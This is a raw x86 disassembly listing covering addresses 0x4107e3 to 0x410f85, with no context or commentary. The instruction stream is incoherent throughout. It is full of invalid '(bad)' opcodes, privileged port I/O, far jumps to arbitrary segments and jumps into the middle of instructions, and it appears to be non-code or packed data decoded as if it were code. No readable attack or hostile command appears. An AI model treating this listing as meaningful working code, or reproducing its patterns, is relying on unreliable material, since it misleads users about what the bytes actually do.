  4107e3:	out    0xcc,eax
  4107e5:	(bad)  
  4107e7:	fld    QWORD PTR [ebx-0x1e1c7137]
  4107ed:	ret    
  4107ee:	(bad)  
  4107ef:	mov    al,0x4a
  4107f1:	and    eax,0xfe33d0b4
  4107f6:	jmp    0xd276:0xef30f80e
  4107fd:	dec    edi
  4107fe:	xor    al,0x4a
  410800:	mov    eax,ds:0x4958501
  410805:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410807:	inc    edx
  410808:	nop
  410809:	(bad)  
  41080a:	arpl   cx,ax
  41080c:	pop    ds
  41080d:	mov    ah,0x7b
  41080f:	cld    
  410810:	or     DWORD PTR [eax],edx
  410812:	rcl    BYTE PTR [edx],0x30
  410815:	mov    BYTE PTR [edi],0x4b
  410818:	retf   
  410819:	add    ecx,DWORD PTR [ecx+0x23aca8]
  41081f:	jns    0x4107b7
  410821:	sti    
  410822:	mov    ebp,0xd20b609
  410827:	les    esi,FWORD PTR [esi-0x765d715d]
  41082d:	xor    al,0xdb
  41082f:	jns    0x410809
  410831:	fcmove st,st(6)
  410833:	push   ebx
  410834:	adc    ebx,edx
  410836:	stc    
  410837:	adc    DWORD PTR [ecx],ebp
  410839:	sub    BYTE PTR [ebx],0x27
  41083c:	out    dx,eax
  41083d:	push   esi
  41083e:	inc    ebp
  41083f:	pop    esi
  410840:	sub    al,0xf
  410842:	leave  
  410843:	xchg   ebx,eax
  410844:	lock fcom QWORD PTR [ebx]
  410847:	retf   0xd32f
  41084a:	xor    esp,DWORD PTR [edi+0x5f7420bf]
  410850:	or     bl,BYTE PTR [ecx-0x65e7b472]
  410856:	leave  
  410857:	mov    eax,ds:0x302ff132
  41085c:	dec    ebp
  41085d:	loopne 0x410809
  41085f:	ror    BYTE PTR [edi+0x6d5e24],1
  410865:	mov    ah,0xa2
  410867:	repz popa 
  410869:	adc    DWORD PTR [edx+0x2abfc48e],esi
  41086f:	xor    ah,BYTE PTR [ebp+0x47eb1a1f]
  410875:	add    DWORD PTR [eax+0x26],ecx
  410878:	cmp    cl,ch
  41087a:	cmp    al,0x4c
  41087c:	jl     0x4108ad
  41087e:	xor    BYTE PTR [ebx-0x13],ah
  410881:	loopne 0x4108b0
  410883:	push   ss
  410884:	xor    DWORD PTR [ecx-0x7bdd7f1d],ebx
  41088a:	arpl   ax,bp
  41088c:	jp     0x410881
  41088e:	add    al,0xe5
  410890:	fadd   DWORD PTR [esi+0x2c]
  410893:	data16 jnp 0x4108ce
  410896:	mov    ds:0xf652837,eax
  41089b:	lahf   
  41089c:	ret    0x723a
  41089f:	idiv   DWORD PTR [ebx+ebp*1-0x63dea447]
  4108a6:	adc    esi,ebp
  4108a8:	or     dh,BYTE PTR [ecx+0x7e14cdf9]
  4108ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108af:	cmp    esp,ebx
  4108b1:	dec    edx
  4108b2:	std    
  4108b3:	or     ebx,DWORD PTR ds:0xc8f22242
  4108b9:	ret    0xa22a
  4108bc:	add    eax,0x2197dd0f
  4108c1:	add    ebp,ebx
  4108c3:	pop    ecx
  4108c4:	dec    esi
  4108c5:	inc    esp
  4108c6:	push   0xffffffa2
  4108c8:	xchg   DWORD PTR [edi+0x6b28f9b6],ebx
  4108ce:	(bad)  
  4108cf:	mov    al,ds:0xc3079cd8
  4108d4:	inc    eax
  4108d5:	lahf   
  4108d6:	cmp    BYTE PTR [esi+0x3e6424ff],dl
  4108dc:	fstp   DWORD PTR [edi-0x6c]
  4108df:	mov    edi,0x234a371d
  4108e4:	lea    edi,[ebx+0x4c]
  4108e7:	pop    es
  4108e8:	stc    
  4108e9:	mov    DWORD PTR [eax],ebp
  4108eb:	pushf  
  4108ec:	mov    eax,0x5d8f8fdc
  4108f1:	jnp    0x4108e9
  4108f3:	mov    edi,0xdb5af554
  4108f8:	pop    edi
  4108f9:	sub    BYTE PTR [ebx],0x2c
  4108fc:	adc    BYTE PTR [esi-0x5e20a437],ch
  410902:	and    BYTE PTR ds:0x3215f1c,0x6c
  410909:	xchg   edx,eax
  41090a:	jbe    0x41091c
  41090c:	pop    eax
  41090d:	add    cl,BYTE PTR [esi+0x5af7bf60]
  410913:	add    dl,cl
  410915:	arpl   WORD PTR ds:0x79030ee9,ax
  41091b:	jp     0x4108a7
  41091d:	cmp    bl,BYTE PTR [ebp-0x241c9bd9]
  410923:	or     eax,0x470023ad
  410928:	ja     0x4108f1
  41092a:	dec    esi
  41092b:	push   cs
  41092c:	outs   dx,DWORD PTR ds:[esi]
  41092d:	pop    eax
  41092e:	xor    DWORD PTR [ebp+0x7d9ec821],0xfffffff9
  410935:	push   0x4d
  410937:	jle    0x4109b7
  410939:	cmp    eax,0x52942017
  41093e:	icebp  
  41093f:	pop    ds
  410940:	ja     0x41090e
  410942:	aaa    
  410943:	(bad)  
  410944:	jle    0x410912
  410946:	and    eax,0xf023b3a7
  41094b:	xor    eax,0xd75eb682
  410950:	inc    DWORD PTR [eax]
  410952:	test   esp,ebp
  410954:	stc    
  410955:	sub    edi,DWORD PTR [ebp-0x42]
  410958:	mov    eax,0xf713cc29
  41095d:	push   cs
  41095e:	adc    DWORD PTR [ecx],0x1b0dbda9
  410964:	loope  0x4109e2
  410966:	push   esi
  410967:	xchg   esp,eax
  410968:	mov    ebx,0xd4531c4
  41096d:	and    al,ch
  41096f:	les    edi,FWORD PTR [esi+0x45]
  410972:	mov    esp,0x704a18c1
  410977:	mov    bh,0xe2
  410979:	fisttp DWORD PTR [edx]
  41097b:	inc    ecx
  41097c:	bound  ebx,QWORD PTR [eax-0x150f2aaa]
  410982:	mov    al,ds:0x19a59080
  410987:	and    ebx,DWORD PTR [ecx+0x5]
  41098a:	sar    bh,1
  41098c:	push   0xffffffec
  41098e:	cs aam 0xbc
  410991:	rcr    BYTE PTR [ecx+0x3b],0xa8
  410995:	fnstsw WORD PTR [edi]
  410997:	and    bh,BYTE PTR [ecx+0x6d]
  41099a:	or     esp,DWORD PTR [ebx]
  41099c:	push   esp
  41099d:	clc    
  41099e:	jle    0x4109b2
  4109a0:	in     eax,dx
  4109a1:	lods   eax,DWORD PTR ds:[esi]
  4109a2:	cdq    
  4109a3:	lods   al,BYTE PTR ds:[esi]
  4109a4:	push   esi
  4109a5:	adc    BYTE PTR [eax+0x136cfd1],cl
  4109ab:	jb     0x410956
  4109ad:	jmp    0x4109b9
  4109af:	(bad)  
  4109b0:	leave  
  4109b1:	pop    ds
  4109b2:	push   es
  4109b3:	jmp    0x1fde:0x593a895c
  4109ba:	add    eax,0xa1b7d820
  4109bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109c0:	sub    ax,0x2e89
  4109c4:	xor    cl,BYTE PTR [edx]
  4109c6:	dec    edx
  4109c7:	add    dl,BYTE PTR [edi-0x5a]
  4109ca:	lea    ecx,[esi+esi*4-0x4d]
  4109ce:	jns    0x4109d1
  4109d0:	test   al,0x9a
  4109d2:	pop    esi
  4109d3:	daa    
  4109d4:	fiadd  DWORD PTR [ebx]
  4109d6:	repnz sbb al,0x57
  4109d9:	sub    al,0xa8
  4109db:	xchg   edi,eax
  4109dc:	call   0x5b89:0xa5af2422
  4109e3:	sub    bl,BYTE PTR ds:0x7c6fe127
  4109e9:	frstor [edx-0x51]
  4109ec:	add    al,0x1f
  4109ee:	and    al,0xd9
  4109f0:	outs   dx,BYTE PTR ds:[esi]
  4109f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109f2:	xor    DWORD PTR [eax-0x4acfd644],eax
  4109f8:	ds push edx
  4109fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109fb:	jle    0x410995
  4109fd:	push   ebp
  4109fe:	mov    ebp,0x86d3fa28
  410a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a04:	cmp    ch,ch
  410a06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a07:	or     eax,0xc7d72893
  410a0c:	(bad)  
  410a0d:	add    ah,bl
  410a0f:	out    dx,eax
  410a10:	mov    fs,esp
  410a12:	and    al,0x55
  410a14:	nop
  410a15:	les    ebp,FWORD PTR [edi-0x77]
  410a18:	mov    esp,DWORD PTR [edx]
  410a1a:	xchg   DWORD PTR [ebx+edx*8],esi
  410a1d:	inc    edx
  410a1e:	mov    ah,0x27
  410a20:	fcmovne st,st(3)
  410a22:	aas    
  410a23:	jbe    0x410a57
  410a25:	fucomi st,st(5)
  410a27:	inc    ebp
  410a28:	mov    cl,0x47
  410a2a:	gs loope 0x410a1c
  410a2d:	ds in  eax,dx
  410a2f:	jle    0x4109b4
  410a31:	push   es
  410a32:	hlt    
  410a33:	mov    bl,0x75
  410a35:	add    dl,dl
  410a37:	daa    
  410a38:	xchg   edx,eax
  410a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3a:	jmp    0x454f:0x3bd7bbc3
  410a41:	popf   
  410a42:	mov    bh,0xdb
  410a44:	in     al,0x72
  410a46:	rcr    ebp,cl
  410a48:	imul   ecx,esp,0xffffffcf
  410a4b:	push   ss
  410a4c:	or     ah,0xf7
  410a4f:	fiadd  WORD PTR [edx+0x4d]
  410a52:	sbb    DWORD PTR [edi+0x62e40aef],0x52c4cfc9
  410a5c:	ss cmp cl,0x9a
  410a60:	shl    esi,1
  410a62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a63:	frstor [ebx+0x43]
  410a66:	ret    
  410a67:	adc    ah,BYTE PTR [eax+0x7ea9bce]
  410a6d:	add    edi,esp
  410a6f:	pushf  
  410a70:	fs dec esi
  410a72:	adc    cl,dl
  410a74:	je     0x410ae7
  410a76:	scas   al,BYTE PTR es:[edi]
  410a77:	fdivr  st,st(5)
  410a79:	mov    esp,eax
  410a7b:	imul   edi,DWORD PTR [ebp-0x61],0xf26f42f6
  410a82:	aaa    
  410a83:	pop    es
  410a84:	inc    edi
  410a85:	push   cs
  410a86:	mov    eax,ds:0xf0d44e35
  410a8b:	out    dx,al
  410a8c:	ror    BYTE PTR [edi],1
  410a8e:	fisub  WORD PTR [edi+0x6817dc2b]
  410a94:	leave  
  410a95:	xor    DWORD PTR [esp+edx*8],esi
  410a98:	sbb    BYTE PTR [esi+0x47],dh
  410a9b:	sub    eax,0x4d975cfc
  410aa0:	imul   eax,DWORD PTR [edi-0x5a9b3f64],0x73
  410aa7:	fnsave [ebp+eax*2-0x1d]
  410aab:	repz test al,0x6c
  410aae:	mov    ecx,DWORD PTR [esi-0x4f]
  410ab1:	pop    DWORD PTR [edx]
  410ab3:	xchg   ebx,eax
  410ab4:	jno    0x410a56
  410ab6:	sub    ebx,edx
  410ab8:	das    
  410ab9:	jge    0x410af6
  410abb:	mov    ds:0x28a2e416,eax
  410ac0:	clc    
  410ac1:	and    cl,al
  410ac3:	pop    esp
  410ac4:	mov    dh,ah
  410ac6:	and    cl,cl
  410ac8:	inc    edx
  410ac9:	inc    esi
  410aca:	dec    eax
  410acb:	inc    ebx
  410acc:	sub    eax,0x2e5e23f7
  410ad1:	or     ah,BYTE PTR [ebp+0x12d6e081]
  410ad7:	xor    esp,edi
  410ad9:	jmp    0xd54f846d
  410ade:	(bad)  
  410adf:	jge    0x410b00
  410ae1:	(bad)  
  410ae2:	fxch   st(2)
  410ae4:	push   ebx
  410ae5:	mov    ds:0x5ed41175,al
  410aea:	ret    0xbb84
  410aed:	xor    eax,0x3bce2476
  410af2:	xchg   ebp,eax
  410af3:	xchg   BYTE PTR [edx-0x5cba120f],ch
  410af9:	mov    ch,0xf1
  410afb:	mov    ch,0x5e
  410afd:	dec    edx
  410afe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aff:	sub    eax,0x9c0f487d
  410b04:	sbb    DWORD PTR [esi+ebx*8+0x16],0xbe01377d
  410b0c:	sahf   
  410b0d:	jmp    0xfa29:0x67aad8a0
  410b14:	ins    DWORD PTR es:[edi],dx
  410b15:	retf   0x9b3f
  410b18:	cmp    ch,BYTE PTR [edi-0x46]
  410b1b:	inc    ecx
  410b1c:	mov    bl,0x51
  410b1e:	dec    esi
  410b1f:	and    eax,DWORD PTR [edx+0x6]
  410b22:	mov    eax,0x7f166877
  410b27:	stos   BYTE PTR es:[edi],al
  410b28:	sahf   
  410b29:	in     eax,dx
  410b2a:	(bad)  
  410b2b:	and    eax,0xab7f9f0b
  410b30:	nop
  410b31:	arpl   WORD PTR [ecx-0xd],ax
  410b34:	xchg   ebx,eax
  410b35:	call   0xe0da:0xd56f2f7d
  410b3c:	dec    edi
  410b3d:	pushf  
  410b3e:	mov    edx,0x8ae167b0
  410b43:	cmp    eax,0x6e68c959
  410b48:	ror    DWORD PTR [ebp+0x3d],1
  410b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4c:	jmp    DWORD PTR [esi]
  410b4e:	push   ebx
  410b4f:	xor    ah,BYTE PTR [esi+0x1ac07065]
  410b55:	cmp    al,0x6c
  410b57:	test   al,0xc8
  410b59:	mov    dh,0x4
  410b5b:	les    ecx,FWORD PTR [eax+0x2]
  410b5e:	push   edi
  410b5f:	aaa    
  410b60:	jbe    0x410be1
  410b62:	sar    bl,1
  410b64:	mov    edx,0x556e5492
  410b69:	push   ecx
  410b6a:	sahf   
  410b6b:	les    esi,FWORD PTR [esi+0x1e]
  410b6e:	andnps xmm6,XMMWORD PTR [esi+edx*1+0x1ba3754c]
  410b76:	pop    edi
  410b77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b78:	xor    edi,ebp
  410b7a:	pop    ds
  410b7b:	outs   dx,BYTE PTR ds:[esi]
  410b7c:	mov    bl,0xc2
  410b7e:	inc    esi
  410b7f:	xchg   ebp,eax
  410b80:	mov    ds:0x40bc3227,al
  410b85:	push   ss
  410b86:	jno    0x410ba2
  410b88:	sbb    bh,BYTE PTR [edi]
  410b8a:	loop   0x410b59
  410b8c:	pop    esp
  410b8d:	mov    WORD PTR [esi],?
  410b8f:	xor    BYTE PTR [edx+edx*2-0x80],0x6d
  410b94:	adc    eax,0x7e536206
  410b99:	mov    dl,0x70
  410b9b:	mov    eax,0x7cd16813
  410ba0:	nop
  410ba1:	pop    ds
  410ba2:	test   eax,0xd073a2bf
  410ba7:	jae    0x410ba1
  410ba9:	fsub   QWORD PTR ds:0x86d4a5ec
  410baf:	mov    gs,WORD PTR [esi+0x6b]
  410bb2:	or     al,0xf1
  410bb4:	scas   eax,DWORD PTR es:[edi]
  410bb5:	nop
  410bb6:	add    al,0xa6
  410bb8:	pop    ebx
  410bb9:	xor    edx,esi
  410bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bbc:	inc    edi
  410bbd:	dec    eax
  410bbe:	sub    ebp,edx
  410bc0:	ins    DWORD PTR es:[edi],dx
  410bc1:	xchg   BYTE PTR [ebx],bh
  410bc3:	rcl    BYTE PTR [edx],0x80
  410bc6:	(bad)  
  410bc7:	adc    al,BYTE PTR [ebp-0x60]
  410bca:	xlat   BYTE PTR ds:[ebx]
  410bcb:	popf   
  410bcc:	ins    BYTE PTR es:[edi],dx
  410bcd:	and    eax,0xdc555786
  410bd2:	test   ecx,0x4151ef7a
  410bd8:	jno    0x410b68
  410bda:	mov    bh,0xff
  410bdc:	jb     0x410c06
  410bde:	popa   
  410bdf:	cmp    eax,0x4aeb6958
  410be4:	pop    esi
  410be5:	test   DWORD PTR [ebp-0x58cca9e],ecx
  410beb:	jg     0x410bc1
  410bed:	sub    DWORD PTR [edx+0x79],esp
  410bf0:	dec    DWORD PTR [edi-0x5c2aca0c]
  410bf6:	es dec esi
  410bf8:	dec    esp
  410bf9:	pop    ds
  410bfa:	ret    
  410bfb:	jge    0x410c67
  410bfd:	xor    BYTE PTR cs:[edi+0x52],0x41
  410c02:	mov    edx,0xf47956db
  410c07:	imul   eax,DWORD PTR [ecx+0x406aa2f2],0x20720ffa
  410c11:	int3   
  410c12:	in     eax,0x51
  410c14:	test   eax,0x53065db4
  410c19:	fidiv  WORD PTR [ebx+0x51d7a1a0]
  410c1f:	iret   
  410c20:	loop   0x410c9e
  410c22:	sub    DWORD PTR [esi-0x55],edx
  410c25:	or     DWORD PTR [esi-0x64e2a428],esi
  410c2b:	fild   DWORD PTR [edi-0x57]
  410c2e:	sub    DWORD PTR [ebx],ebx
  410c30:	ds cmp al,0x62
  410c33:	es mov ebp,0x5425fc40
  410c39:	and    al,0xb9
  410c3b:	int3   
  410c3c:	std    
  410c3d:	(bad)  
  410c3e:	jmp    0x410bfc
  410c40:	mov    esp,0x1b852f70
  410c45:	push   esp
  410c46:	clc    
  410c47:	or     DWORD PTR [eax+0x7d],edi
  410c4a:	cs sub al,cl
  410c4d:	jle    0x410bd9
  410c4f:	mov    esp,0xa14b6d32
  410c54:	or     ebp,DWORD PTR [ebp-0x2bd753f7]
  410c5a:	mov    WORD PTR [esi+ebp*8-0x29],ss
  410c5e:	scas   eax,DWORD PTR es:[edi]
  410c5f:	inc    edi
  410c60:	push   0x26
  410c62:	mov    ch,0x9d
  410c64:	daa    
  410c65:	ins    BYTE PTR es:[edi],dx
  410c66:	push   esi
  410c67:	lea    edx,[edx]
  410c69:	xchg   edi,eax
  410c6a:	fld    st(0)
  410c6c:	xor    DWORD PTR [eax+0x0],eax
  410c6f:	dec    ecx
  410c70:	ds adc esi,edx
  410c73:	pusha  
  410c74:	rcr    DWORD PTR [ecx-0x80],0xc9
  410c78:	mov    esp,DWORD PTR [eax-0x57]
  410c7b:	xchg   ecx,eax
  410c7c:	clc    
  410c7d:	test   DWORD PTR [ebx],ecx
  410c7f:	add    cl,BYTE PTR [ebx]
  410c81:	or     al,al
  410c83:	or     esi,DWORD PTR [ecx-0x1f8d739]
  410c89:	test   DWORD PTR [eax-0x6],ebp
  410c8c:	push   eax
  410c8d:	test   DWORD PTR [edi],edx
  410c8f:	push   di
  410c91:	push   ss
  410c92:	bound  eax,QWORD PTR [ecx]
  410c94:	sub    ebx,DWORD PTR [edi-0x2e189e74]
  410c9a:	inc    ebx
  410c9b:	out    0xde,al
  410c9d:	out    dx,eax
  410c9e:	and    ch,dl
  410ca0:	xor    DWORD PTR [edi+0x6d],edx
  410ca3:	(bad)  
  410ca4:	pop    edi
  410ca5:	cmp    eax,0x35150ad9
  410caa:	daa    
  410cab:	pop    ebp
  410cac:	or     esp,edi
  410cae:	push   edi
  410caf:	dec    eax
  410cb0:	pop    eax
  410cb1:	mov    ds:0xb922d1d2,al
  410cb6:	test   dl,ch
  410cb8:	sub    ebp,DWORD PTR [edx+0x6e2f0c3a]
  410cbe:	ins    BYTE PTR es:[edi],dx
  410cbf:	inc    eax
  410cc0:	leave  
  410cc1:	xor    ah,BYTE PTR [edx+0x3]
  410cc4:	sbb    al,0xa0
  410cc6:	mov    eax,ds:0xd50b1ff2
  410ccb:	adc    al,0xa5
  410ccd:	mov    esp,0x3435d792
  410cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd3:	aaa    
  410cd4:	jg     0x410c60
  410cd6:	push   ebx
  410cd7:	inc    edi
  410cd8:	dec    ebx
  410cd9:	test   DWORD PTR [ecx],edx
  410cdb:	cs push edi
  410cdd:	out    0x6e,eax
  410cdf:	sahf   
  410ce0:	dec    esi
  410ce1:	test   eax,0x3ac56bee
  410ce6:	and    ah,0x75
  410ce9:	xchg   ecx,eax
  410cea:	sub    al,BYTE PTR [ecx]
  410cec:	push   eax
  410ced:	imul   ebp,DWORD PTR [esi-0x48],0x684e65f1
  410cf4:	loope  0x410d0e
  410cf6:	fistp  WORD PTR [edx]
  410cf8:	test   BYTE PTR [ebx+0x55],cl
  410cfb:	dec    ecx
  410cfc:	and    ah,cl
  410cfe:	add    eax,0xd8321639
  410d03:	sbb    esp,DWORD PTR [ebp+0x32]
  410d06:	and    eax,0xdeb9dd57
  410d0b:	stos   DWORD PTR es:[edi],eax
  410d0c:	pop    bp
  410d0e:	(bad)  
  410d0f:	clc    
  410d10:	addr16 dec eax
  410d12:	aad    0xa
  410d14:	cli    
  410d15:	mov    ch,0x4e
  410d17:	lds    edi,FWORD PTR [ebx]
  410d19:	push   ss
  410d1a:	int    0xa8
  410d1c:	mov    ebx,0x5a4e0fc9
  410d21:	push   eax
  410d22:	sub    DWORD PTR cs:[ebx],0xf00dc4c8
  410d29:	inc    ecx
  410d2a:	cmp    cl,BYTE PTR [edx+0x44]
  410d2d:	mul    DWORD PTR [edx]
  410d2f:	popf   
  410d30:	mov    eax,0xd21d588
  410d35:	cld    
  410d36:	mov    cl,0xd2
  410d38:	pop    esp
  410d39:	inc    ecx
  410d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d3b:	ja     0x410daa
  410d3d:	out    0x50,al
  410d3f:	or     al,0xcd
  410d41:	test   dh,ah
  410d43:	add    BYTE PTR [ecx],bl
  410d45:	addr16 repnz inc eax
  410d48:	outs   dx,DWORD PTR ds:[esi]
  410d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d4a:	test   eax,0x2ea10f2f
  410d4f:	test   al,0x25
  410d51:	shl    DWORD PTR [ecx-0x27],cl
  410d54:	test   DWORD PTR [eax+ebx*2],ebp
  410d57:	hlt    
  410d58:	lds    edx,FWORD PTR [ebp-0x7f]
  410d5b:	sbb    edi,eax
  410d5d:	pslld  mm5,QWORD PTR [ebx-0x151e4a4]
  410d64:	mov    DWORD PTR [esi],ecx
  410d66:	xchg   esp,eax
  410d67:	jmp    0x410d67
  410d69:	sbb    al,0x29
  410d6b:	and    eax,0x4cf143f6
  410d70:	(bad)  
  410d71:	jmp    0x410de2
  410d73:	stos   BYTE PTR es:[edi],al
  410d74:	inc    esi
  410d75:	not    DWORD PTR [eax+0x611650ba]
  410d7b:	inc    esp
  410d7c:	xor    eax,DWORD PTR [edi-0x6bd94e0]
  410d82:	and    eax,DWORD PTR [ebx]
  410d84:	mov    esi,0xf1b0724f
  410d89:	xor    al,0x26
  410d8b:	sbb    esp,DWORD PTR [ebx+0x76]
  410d8e:	in     al,0x39
  410d90:	or     DWORD PTR [eax-0x12],ecx
  410d93:	xlat   BYTE PTR ds:[ebx]
  410d94:	lock inc eax
  410d96:	fs mov cl,0x20
  410d99:	pop    ecx
  410d9a:	push   edi
  410d9b:	xor    esp,DWORD PTR [edi+0x3fa4b913]
  410da1:	lahf   
  410da2:	dec    esi
  410da3:	pusha  
  410da4:	fs rcr al,1
  410da7:	sub    ebx,DWORD PTR [ecx+0x3c]
  410daa:	push   es
  410dab:	add    bh,bh
  410dad:	or     DWORD PTR ds:0xcca6133,ebp
  410db3:	mov    bl,0xaa
  410db5:	xor    edi,0xffffffd1
  410db8:	sbb    al,bl
  410dba:	enter  0x9db4,0xc1
  410dbe:	pop    di
  410dc0:	les    ebp,FWORD PTR [ebx+0x18c3d1df]
  410dc6:	fcmovu st,st(7)
  410dc8:	adc    al,0xc0
  410dca:	lds    ebp,FWORD PTR [eax]
  410dcc:	push   0xe04176ff
  410dd1:	lea    ecx,[esi-0x7a]
  410dd4:	mov    edi,0xdc9e28b0
  410dd9:	test   eax,0xd03ddae
  410dde:	xor    al,0xf3
  410de0:	dec    esi
  410de1:	and    edx,ebp
  410de3:	aaa    
  410de4:	sbb    esi,esi
  410de6:	mov    edi,0xb676d6e5
  410deb:	imul   ebp,DWORD PTR [ebx+0x55],0x9ce844a2
  410df2:	in     eax,0xe2
  410df4:	dec    eax
  410df5:	dec    ebp
  410df6:	push   ecx
  410df7:	ret    0x8197
  410dfa:	xchg   DWORD PTR [edi],esi
  410dfc:	nop
  410dfd:	add    DWORD PTR [eax],ebx
  410dff:	pop    ebx
  410e00:	gs leave 
  410e02:	sub    eax,0xf3a3749e
  410e07:	ret    0x2f9f
  410e0a:	dec    esp
  410e0b:	add    DWORD PTR [ecx+0x6ede86eb],ebx
  410e11:	ins    BYTE PTR es:[edi],dx
  410e12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e13:	sub    BYTE PTR [eax+0xf],0x66
  410e17:	(bad)  
  410e18:	and    al,0xd0
  410e1a:	push   edx
  410e1b:	add    DWORD PTR [esi-0x79],edx
  410e1e:	push   es
  410e1f:	cld    
  410e20:	push   es
  410e21:	pop    edi
  410e22:	cmp    BYTE PTR [esi+0x61],bl
  410e25:	sti    
  410e26:	mov    ecx,0xebac80b0
  410e2b:	outs   dx,BYTE PTR ds:[esi]
  410e2c:	fwait
  410e2d:	mov    eax,ds:0x4e21b034
  410e32:	pop    es
  410e33:	inc    esi
  410e34:	cmp    al,BYTE PTR [eax]
  410e36:	pushf  
  410e37:	dec    esi
  410e38:	retf   0x3cb8
  410e3b:	jns    0x410e67
  410e3d:	in     eax,0x3
  410e3f:	call   0xda1ef59c
  410e44:	loope  0x410e07
  410e46:	dec    eax
  410e47:	jbe    0x410e2a
  410e49:	test   BYTE PTR [eax+0x1997bfe0],cl
  410e4f:	jnp    0x410e55
  410e51:	mov    ebx,0xed58b418
  410e56:	jp     0x410e99
  410e58:	cli    
  410e59:	repz icebp 
  410e5b:	fstp   DWORD PTR [edx]
  410e5d:	fbld   TBYTE PTR [esi+0xb]
  410e60:	inc    ecx
  410e61:	leave  
  410e62:	pop    ecx
  410e63:	cdq    
  410e64:	add    DWORD PTR [eax],0xffffffa3
  410e67:	hlt    
  410e68:	scas   al,BYTE PTR es:[edi]
  410e69:	xor    ebx,DWORD PTR [edi]
  410e6b:	sbb    esp,ebp
  410e6d:	cs mov ebp,0xb8960194
  410e73:	pop    ebx
  410e74:	hlt    
  410e75:	sti    
  410e76:	jmp    0x911948ab
  410e7b:	dec    edi
  410e7c:	je     0x410ee9
  410e7e:	pop    ebx
  410e7f:	xchg   DWORD PTR [edx+0xb],ecx
  410e82:	imul   ebp,edi,0xf9dfd92b
  410e88:	or     bl,al
  410e8a:	je     0x410ee6
  410e8c:	dec    ebx
  410e8d:	(bad)  
  410e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e91:	jg     0x410e9a
  410e93:	lea    ebx,[edi-0x44]
  410e96:	add    BYTE PTR [edi],dh
  410e98:	xor    al,0xa8
  410e9a:	inc    esp
  410e9b:	jae    0x410e45
  410e9d:	repz add edi,DWORD PTR [edx-0x258898e]
  410ea4:	imul   edx,DWORD PTR es:[eax+ebp*4],0xffffffe6
  410ea9:	and    al,0x50
  410eab:	xor    eax,0x1bcef684
  410eb0:	xor    DWORD PTR [ecx+eiz*1-0x7],esp
  410eb4:	xchg   ecx,eax
  410eb5:	(bad)  
  410eb7:	fst    DWORD PTR [edi-0x40]
  410eba:	test   al,0xd8
  410ebc:	mov    esp,0x5b0ae1bb
  410ec1:	scas   eax,DWORD PTR es:[edi]
  410ec2:	clc    
  410ec3:	in     eax,dx
  410ec4:	cld    
  410ec5:	fmul   DWORD PTR [edi+edi*1-0x15664a41]
  410ecc:	or     al,0x6
  410ece:	sub    ebp,DWORD PTR [edi+0x54]
  410ed1:	xchg   BYTE PTR [ebx+0x5516e36d],bh
  410ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ed8:	sub    eax,0x77cec47
  410edd:	retfw  0xda42
  410ee1:	jbe    0x410f1e
  410ee3:	scas   eax,DWORD PTR es:[edi]
  410ee4:	arpl   ax,dx
  410ee6:	pop    edx
  410ee7:	loop   0x410f50
  410ee9:	call   0x18bfdc9c
  410eee:	iret   
  410eef:	jmp    0x1ec02690
  410ef4:	gs out 0xac,eax
  410ef7:	es sbb al,0x88
  410efa:	sbb    cl,BYTE PTR [ecx]
  410efc:	das    
  410efd:	sub    bl,BYTE PTR [ecx]
  410eff:	add    eax,0xb069b0ff
  410f04:	push   edx
  410f05:	es or  al,0x3d
  410f08:	inc    eax
  410f09:	push   cs
  410f0a:	mov    edi,0x16ba75dd
  410f0f:	clc    
  410f10:	lds    ebp,FWORD PTR [eax]
  410f12:	popa   
  410f13:	fsub   DWORD PTR cs:[ecx]
  410f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f17:	push   ss
  410f18:	push   0x34
  410f1a:	xor    BYTE PTR cs:[eax+0x51],dl
  410f1e:	call   0x9cea48a1
  410f23:	into   
  410f24:	inc    eax
  410f25:	xor    edi,DWORD PTR [edx+0x20896c37]
  410f2b:	rol    ebp,0x1a
  410f2e:	sbb    ebp,DWORD PTR [eax]
  410f30:	adc    dh,BYTE PTR [ebx]
  410f32:	xchg   esi,eax
  410f33:	mov    ds:0xecfa872a,al
  410f38:	int    0x4c
  410f3a:	adc    ebx,edx
  410f3c:	das    
  410f3d:	cmp    BYTE PTR [eax+0x1c],al
  410f40:	jg     0x410f3e
  410f42:	cld    
  410f43:	out    0x85,al
  410f45:	cmp    ebp,DWORD PTR [ecx-0x3c2758ae]
  410f4b:	push   es
  410f4c:	or     eax,DWORD PTR [eax]
  410f4e:	ficomp WORD PTR [ebx]
  410f50:	jle    0x410f62
  410f52:	dec    ebp
  410f53:	inc    ebp
  410f54:	push   esi
  410f55:	jge    0x410fa2
  410f57:	mov    edx,0x4bd1744e
  410f5c:	leave  
  410f5d:	(bad)  
  410f5e:	ror    DWORD PTR [ecx-0x49],cl
  410f61:	mov    bh,0x7c
  410f63:	pop    ecx
  410f64:	pop    es
  410f65:	cmp    eax,0xaca05481
  410f6a:	dec    BYTE PTR [edi-0x45c673d6]
  410f70:	mov    ecx,DWORD PTR [ebp-0x7735fe8d]
  410f76:	mov    ecx,DWORD PTR ds:0x954c
  410f7b:	adc    esi,DWORD PTR [edi]
  410f7d:	mov    edi,0x67978722
  410f82:	or     al,0xa2
  410f84:	push   esp
  410f85:	ss xchg edi,eax
